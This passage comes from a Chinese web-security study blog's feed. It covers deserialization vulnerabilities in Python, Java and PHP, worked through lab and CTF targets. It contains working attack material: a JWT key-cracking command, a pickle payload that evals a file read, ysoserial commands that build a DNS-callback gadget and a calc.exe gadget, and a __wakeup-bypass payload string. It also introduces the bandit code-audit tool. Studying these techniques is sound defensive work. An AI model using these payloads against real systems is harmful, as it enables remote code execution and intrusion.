src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221164338263.png" alt="image-20230221164338263"></p><p>所以采取爆破jwt密匙脚本：</p><blockquote><p>cd &#x2F;c-jwt-cracker</p><p>.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InhpYW9kaSJ9.UHCykJtUJ4jeYAWAYFU73QiNhn7mZLUHE7kKo4oJpK8</p></blockquote><p>爆破出密匙是1KUN</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221165144676.png" alt="image-20230221165144676"></p><p>将jwt复制到刚才的数据包进行替换jwt，放包成功：</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221165242902.png" alt="image-20230221165242902"></p><p>右键源码下有压缩包，由此进入python反序列化利用</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221165430307.png" alt="image-20230221165430307"></p><p>打开源码搜索序列化函数pickle</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221165611327.png" alt="image-20230221165611327"></p><p>此处接收become进行url编码和反序列化操作</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221170003334.png" alt="image-20230221170003334"></p><p>攻击则采用序列化脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br></pre></td></tr></table></figure><p>执行cmd命令生成payload</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221170707658.png" alt="image-20230221170707658"></p><p>找到数据传输的地方，看是哪个文件调用的传输become参数的def post方法，找哪里调用了Admin.py文件，于是追踪哪里调用了类对象AdminHandler</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221171349789.png" alt="image-20230221171349789"></p><p>发现是init文件调用了此方法，访问路径为&#x2F;b1g_m4mber,后面就可构造执行数据包了</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221171510030.png" alt="image-20230221171510030"></p><h4 id="代码审计-自动化工具-bandit安装及使用"><a href="#代码审计-自动化工具-bandit安装及使用" class="headerlink" title="#代码审计-自动化工具-bandit安装及使用"></a>#代码审计-自动化工具-bandit安装及使用</h4><p>参考：<a href="https://bandit.readthedocs.io/">https://bandit.readthedocs.io/</a></p><p>安装：pip install bandit</p><p>linux:</p><p>安装后会在当前Python目录下bin</p><p>使用：bandit -r 需要审计的源码目录</p><p>windows:</p><p>安装后会在当前Python目录下script</p><p>使用：bandit -r 需要审计的源码目录</p><p>bandit可以检索到上个案例中的反序列化漏洞</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221172031382.png" alt="image-20230221172031382"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、Python-反序列化函数使用&lt;/p&gt;
&lt;p&gt;2、Python-反序列化魔术方法&lt;/p&gt;
&lt;p&gt;3、Python-反</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day47 WEB攻防-通用漏洞&amp;Java反序列化&amp;EXP生成&amp;数据提取&amp;组件安全</title>
    <link href="http://example.com/2023/02/03/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    <id>http://example.com/2023/02/03/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/</id>
    <published>2023-02-02T17:50:28.000Z</published>
    <updated>2023-02-21T07:23:47.529Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Java反序列化演示-原生API接口</p><p>2、Java反序列化漏洞利用-Ysoserial使用</p><p>3、Java反序列化漏洞发现利用点-函数&amp;数据</p><p>4、Java反序列化考点-真实&amp;CTF赛题-审计分析</p><h3 id="内容点："><a href="#内容点：" class="headerlink" title="#内容点："></a>#内容点：</h3><p>1、明白-Java反序列化原理</p><p>2、判断-Java反序列化漏洞</p><p>3、学会-Ysoserial工具使用</p><p>4、学会-SerializationDumper</p><p>5、了解-简要Java代码审计分析</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="#前置知识:"></a>#前置知识:</h3><h4 id="序列化和反序列化的概念："><a href="#序列化和反序列化的概念：" class="headerlink" title="序列化和反序列化的概念："></a>序列化和反序列化的概念：</h4><p>序列化：把Java对象转换为字节序列的过程。</p><p>反序列化：把字节序列恢复为Java对象的过程。</p><p>对象的序列化主要有两种用途：</p><p>把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；（持久化对象）</p><p>在网络上传送对象的字节序列。（网络传输对象）</p><h4 id="函数接口："><a href="#函数接口：" class="headerlink" title="函数接口："></a>函数接口：</h4><p>Java： Serializable Externalizable接口、fastjson、jackson、gson、ObjectInputStream.read、ObjectObjectInputStream.readUnshared、XMLDecoder.read、ObjectYaml.loadXStream.fromXML、ObjectMapper.readValue、JSON.parseObject等</p><p>PHP： serialize()、 unserialize() </p><p>Python：pickle</p><h4 id="数据出现："><a href="#数据出现：" class="headerlink" title="数据出现："></a>数据出现：</h4><p>1、功能特性：</p><p>反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘、或DB存储等业务场景。因此审计过程中重点关注这些功能板块。</p><p>2、数据特性：</p><p>一段数据以<strong>rO0AB</strong>开头，你基本可以确定这串就是JAVA序列化base64加密的数据。</p><p>或者如果以<strong>aced</strong>开头，那么他就是这一段java序列化的16进制。</p><p>3、出现具体：</p><p>http参数，cookie，sesion，存储方式可能是base64(rO0），压缩后的base64(H4s),MII等Servlets http,Sockets,Session管理器，包含的协议就包括：JMX,RMI,JMS,JND1等(\xac\Xed) xm lXstream,XmldEcoder等（http Body:Content-type: application&#x2F;xml）json(jackson,fastjson)http请求中包含</p><h4 id="发现："><a href="#发现：" class="headerlink" title="-发现："></a>-发现：</h4><p>黑盒分析：数据库出现地-观察数据特性</p><p>白盒分析：组件安全&amp;函数搜索&amp;功能模块</p><h4 id="利用："><a href="#利用：" class="headerlink" title="-利用："></a>-利用：</h4><p>Ysoserial集成的jar包配合生成，特性的专业漏洞利用工具等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 原生API-Ysoserial_URLDNS使用</p><p>➢ 三方组件-Ysoserial_支持库生成使用</p><p>➢ 解密分析-SerializationDumper数据分析</p><p>➢ CTF赛题-[网鼎杯2020朱雀组]ThinkJava</p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><h5 id="➢-原生API-Ysoserial-URLDNS使用"><a href="#➢-原生API-Ysoserial-URLDNS使用" class="headerlink" title="➢ 原生API-Ysoserial_URLDNS使用"></a>➢ 原生API-Ysoserial_URLDNS使用</h5><p>在dnslog生成url测试dns连接：</p><p>没组件生成DNS利用：</p><blockquote><p>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS “<a href="http://5csix6.dnslog.cn/">http://5csix6.dnslog.cn</a>“ &gt; a.bin</p></blockquote><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/image-20230221130153008.png" alt="image-20230221130153008"></p><p>复制粘贴base64编码后的内容：</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/image-20230221130459043.png" alt="image-20230221130459043"></p><p>发现有回显：</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/image-20230221130416891.png" alt="image-20230221130416891"></p><h5 id="➢-三方组件-Ysoserial-支持库生成使用"><a href="#➢-三方组件-Ysoserial-支持库生成使用" class="headerlink" title="➢ 三方组件-Ysoserial_支持库生成使用"></a>➢ 三方组件-Ysoserial_支持库生成使用</h5><h6 id="分析漏洞："><a href="#分析漏洞：" class="headerlink" title="分析漏洞："></a>分析漏洞：</h6><p>靶场webgoat—Insecure Deserializetion—5</p><p>题目给的数据是rO0AB开头，所以是经过了base64加密的java序列化对象。</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p><p> 解码后是一段英文，百度翻译也没发现有啥用处：</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-16769497958759.png" alt="img"></p><p>题目还给出了一个接收序列化数据的表单，先分析一波：</p><p>用burpsuite抓包：</p><p> <img src="https://img-blog.csdnimg.cn/022a10fc96ac48dbac308d45bc3b5c9e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p><p> 可以看到，表单提交的数据通过token接收，并发送到&#x2F;InsecureDeserialization&#x2F;task这个页面，可以通过&#x2F;InsecureDeserialization&#x2F;task找出对应的源码，所以，页面接收的token是一段经过base64编码的序列化数据</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-167694992761215.png" alt="img"></p><h6 id="利用漏洞：—-ysoserial工具"><a href="#利用漏洞：—-ysoserial工具" class="headerlink" title="利用漏洞：—-ysoserial工具"></a>利用漏洞：—-ysoserial工具</h6><p>找到了传输序列化数据的接口，接下来就需要构造payload了</p><p>首先肯定是查找已知漏洞的利用，对于分析代码去构造payload，没技术不说，也没时间去搞，最简单最直接就是找披露过的java插件漏洞。</p><p>运行ysoserial工具</p><p>java -jar ysoserial.jar</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-167694999310318.png" alt="img"></p><p>按照ysoserial支持的插件，查找webgoat是否安装了对应的jar包，这里只有两个：</p><p>Hibernate和spring-core 但是spring-core的版本不一致，所以就选择Hibernate</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-167695000829021.png" alt="img"></p><p>将Hibernate的jar包复制到ysoserial工具的目录下，jar包名字中必须是有core的，是插件的核心</p><p> 我这里是hibernate-core-5.4.6.Final.jar这个包，利用ysoserial生成payload，执行以下命令</p><blockquote><p> java -Dhibernate5 -cp hibernate-core-5.4.6.Final.jar;ysoserial.jar ysoserial.GeneratePayload Hibernate1 calc.exe &gt; token.bin</p></blockquote><p> java -Dhibernate5 -cp hibernate-core-5.4.6.Final.jar;  &#x2F;&#x2F;表示hibernate5的插件</p><p>ysoserial.jar ysoserial.GeneratePayload Hibernate1 calc.exe &gt; token.bin  &#x2F;&#x2F;生成Hibernate1插件反序列化漏洞的payload，执行calc.exe命令，将payload保存在token.bin文件中</p><p>payload生成了，但是表单接收的是经过base64编码的：采用python写的简单脚本对payloadbase64编码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">filename = <span class="built_in">input</span>(<span class="string">&quot;输入需要base64编码的文件名：&quot;</span>)</span><br><span class="line">s = <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>).read() <span class="comment">#文本默认模式读取文件内容rt</span></span><br><span class="line">base64_str = base64.urlsafe_b64encode(s)</span><br><span class="line"><span class="comment">#文本默认模式写入文件内容wt</span></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;base64.txt&quot;</span>, <span class="string">&quot;wt&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>).write(base64_str.decode())</span><br></pre></td></tr></table></figure><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-167695018053324.png" alt="img"></p><p>将编码的字符串提交：成功执行calc.exe命令</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-167695019540927.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、Java反序列化演示-原生API接口&lt;/p&gt;
&lt;p&gt;2、Java反序列化漏洞利用-Ysoserial使用&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day46 WEB攻防-通用漏洞&amp;PHP反序列化&amp;原生类&amp;漏洞绕过&amp;公私有属性</title>
    <link href="http://example.com/2023/02/03/Day46-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8E%9F%E7%94%9F%E7%B1%BB-%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87-%E5%85%AC%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7/"/>
    <id>http://example.com/2023/02/03/Day46-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8E%9F%E7%94%9F%E7%B1%BB-%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87-%E5%85%AC%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7/</id>
    <published>2023-02-02T17:49:20.000Z</published>
    <updated>2023-02-04T06:59:50.979Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、反序列化魔术方法全解</p><p>2、反序列化变量属性全解</p><p>3、反序列化魔术方法原生类</p><p>4、反序列化语言特性漏洞绕过</p><p>-其他魔术方法 </p><p>-共有&amp;私有&amp;保护 </p><p>-语言模式方法漏洞 </p><p>-原生类获取利用配合</p><h3 id="反序列化利用大概分类三类"><a href="#反序列化利用大概分类三类" class="headerlink" title="#反序列化利用大概分类三类"></a>#反序列化利用大概分类三类</h3><p>-魔术方法的调用逻辑-如触发条件</p><p>-语言原生类的调用逻辑-如SoapClient</p><p>-语言自身的安全缺陷-如CVE-2016-7124</p><h3 id="反序列化课程点："><a href="#反序列化课程点：" class="headerlink" title="#反序列化课程点："></a>#反序列化课程点：</h3><p>-PHP&amp;Java&amp;Python</p><p>序列化：对象转换为数组或字符串等格式</p><p>反序列化：将数组或字符串等格式转换成对象</p><p>serialize()     &#x2F;&#x2F;将一个对象转换成一个字符串</p><p>unserialize()   &#x2F;&#x2F;将字符串还原成一个对象</p><h3 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="#PHP反序列化漏洞"></a>#PHP反序列化漏洞</h3><p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。</p><h3 id="魔术方法利用点分析："><a href="#魔术方法利用点分析：" class="headerlink" title="#魔术方法利用点分析："></a>#魔术方法利用点分析：</h3><p>触发：unserialize函数的变量可控，文件中存在可利用的类，类中有魔术方法：</p><p>__construct(): &#x2F;&#x2F;构造函数，当对象new的时候会自动调用</p><p>__destruct()：&#x2F;&#x2F;析构函数当对象被销毁时会被自动调用</p><p>__wakeup(): &#x2F;&#x2F;unserialize()时会被自动调用</p><p>__invoke(): &#x2F;&#x2F;当尝试以调用函数的方法调用一个对象时，会被自动调用</p><p>__call(): &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发</p><p>__callStatci(): &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发</p><p>__get(): &#x2F;&#x2F;用于从不可访问的属性读取数据</p><p>__set(): &#x2F;&#x2F;用于将数据写入不可访问的属性</p><p>__isset(): &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发</p><p>__unset(): &#x2F;&#x2F;在不可访问的属性上使用unset()时触发</p><p>__toString(): &#x2F;&#x2F;把类当作字符串使用时触发</p><p>__sleep(): &#x2F;&#x2F;serialize()函数会检查类中是否存在一个魔术方法sleep() 如果存在，该方法会被优先调用</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 方法&amp;属性-调用详解&amp;变量数据详解</p><p>➢ CTF-语言漏洞-__wakeup()方法绕过</p><p>➢ CTF-方法原生类-获取&amp;利用&amp;配合其他</p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><h4 id="CTF-语言漏洞-wakeup-方法绕过"><a href="#CTF-语言漏洞-wakeup-方法绕过" class="headerlink" title="#CTF-语言漏洞-__wakeup()方法绕过"></a>#CTF-语言漏洞-__wakeup()方法绕过</h4><p> [极客大挑战 2019]PHP CVE-2016-7124 </p><p>如果存在__wakeup方法，调用unserilize()方法前则先调用__wakeup方法，</p><p>但是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p><p>1、下载源码分析，触发flag条件</p><p>2、分析会触发调用__wakeup 强制username值</p><p>3、利用语言漏洞绕过 CVE-2016-7124</p><p>4、构造payload后 修改满足漏洞条件触发</p><p>Pyload:</p><p>select&#x3D;O%3A4%3A”Name”%3A3%3A%7Bs%3A14%3A”%00Name%00username”%3Bs%3A5%3A”admin”%3Bs%3A14%3A”%00Name%00password”%3Bi%3A100%3B%7D</p><h4 id="CTF-方法原生类-获取-amp-利用-amp-配合其他"><a href="#CTF-方法原生类-获取-amp-利用-amp-配合其他" class="headerlink" title="#CTF-方法原生类-获取&amp;利用&amp;配合其他"></a>#CTF-方法原生类-获取&amp;利用&amp;配合其他</h4><p>参考案例：<a href="https://www.anquanke.com/post/id/264823">https://www.anquanke.com/post/id/264823</a></p><p>-PHP有那些原生类-见脚本使用</p><p>-常见使用的原生类-见参考案例</p><p>-原生类该怎么使用-见官方说明</p><p>0、生成原生类</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line"></span><br><span class="line">​    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">​            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line"></span><br><span class="line">​            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line"></span><br><span class="line">​            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line"></span><br><span class="line">​            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line"></span><br><span class="line">​            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line"></span><br><span class="line">​            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line"></span><br><span class="line">​            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line"></span><br><span class="line">​            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line"></span><br><span class="line">​            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line"></span><br><span class="line">​            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line"></span><br><span class="line">​            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line"></span><br><span class="line">​        ))) &#123;</span><br><span class="line"></span><br><span class="line">​            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>1、本地Demo-xss</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;k&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">-输出对象可调用__toString</span><br><span class="line"></span><br><span class="line">-无代码通过原生类<span class="built_in">Exception</span></span><br><span class="line"></span><br><span class="line">-<span class="built_in">Exception</span>使用查询编写利用</span><br><span class="line"></span><br><span class="line">-通过访问触发输出产生XSS漏洞</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span 